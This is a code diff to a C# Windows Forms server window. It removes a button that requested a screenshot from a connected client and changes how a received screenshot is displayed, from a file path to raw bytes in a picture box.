@@ -36,48 +36,42 @@ namespace Server
 
         }
 
-        private void button2_Click(object sender, EventArgs e)
+
+
+        public void DisplayScreenshotBytes(byte[] imgBytes)
         {
-            try
-            {
-
-                ServerSocket.SendCommand(_idCliente, "screenshot", Channel.Screenshot);
-
-            }
-            catch (Exception ex)
-            {
-                MessageBox.Show("Error al capturar la pantalla: " + ex.Message);
-            }
-        }
-
-        public void DisplayScreenshot(string imagePath)
-        {
-
             if (InvokeRequired)
             {
-                Invoke(new Action<string>(DisplayScreenshot), imagePath);
+                Invoke(new Action<byte[]>(DisplayScreenshotBytes), imgBytes);
                 return;
             }
 
             try
             {
-                if (File.Exists(imagePath))
+                if (pictureBox1.Image != null)
                 {
-                    using (FileStream stream = new FileStream(imagePath, FileMode.Open, FileAccess.Read))
-                    {
-                        Image img = Image.FromStream(stream);
-                        pictureBox1.Image = new Bitmap(img); // Copia para liberar el stream
-                    }
-
-                    pictureBox1.SizeMode = PictureBoxSizeMode.Zoom; // Asegura que la imagen se ajuste
+                    pictureBox1.Image.Dispose();
+                    pictureBox1.Image = null;
                 }
+
+                using (var ms = new MemoryStream(imgBytes))
+                {
+                    using (Image img = Image.FromStream(ms))
+                    {
+                       
+                        pictureBox1.Image = new Bitmap(img);
+                       
+                    }
+                }
+                pictureBox1.SizeMode = PictureBoxSizeMode.Zoom;
             }
             catch (Exception ex)
             {
-                MessageBox.Show("Error al mostrar la captura: " + ex.Message);
+                MessageBox.Show("ERROR AL MOSTRAR: " + ex.ToString());
             }
-
-
         }
+
+
+
     }
 }
